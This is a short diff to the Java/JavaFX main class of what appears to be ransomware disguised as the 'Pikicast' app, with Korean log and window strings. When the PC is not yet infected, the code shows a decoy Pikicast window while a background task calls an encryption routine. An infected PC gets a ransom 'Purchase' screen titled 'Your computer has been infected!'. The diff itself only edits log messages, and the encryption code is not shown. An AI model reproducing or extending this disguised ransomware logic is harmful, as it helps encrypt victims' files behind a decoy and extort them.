@@ -26,7 +26,7 @@ public class Main extends Application {
     @Override
     public void start(Stage stage) throws Exception {
         if (encryptionController.isEncrypted()) {
-            System.out.println("이미 감염되있는 PC 입니다");
+            System.out.println("[Log] 이미 감염되있는 PC 입니다");
             Scene scene = new Scene(FXMLLoader.load(getClass().getResource("Purchase.fxml")));
             stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
             stage.setResizable(false);
@@ -35,7 +35,7 @@ public class Main extends Application {
         } else {
             Parent root1 = FXMLLoader.load(getClass().getResource("MainPage.fxml"));
             Parent root2 = FXMLLoader.load(getClass().getResource("Purchase.fxml"));
-            System.out.println("감염되지 않은 PC 입니다. Pikicast를 보여줍니다.");
+            System.out.println("[Log] 감염되지 않은 PC 입니다. Pikicast를 보여줍니다.");
             Scene scene1 = new Scene(root1);
             stage.setTitle("Pikicast");
             stage.setScene(scene1);
@@ -45,7 +45,6 @@ public class Main extends Application {
             Task<Void> task = new Task<Void>() {
                 @Override
                 protected Void call() throws Exception {
-                    System.out.println("암호화 시작");
                     encryptionController.encryption();
                     return null;
                 }
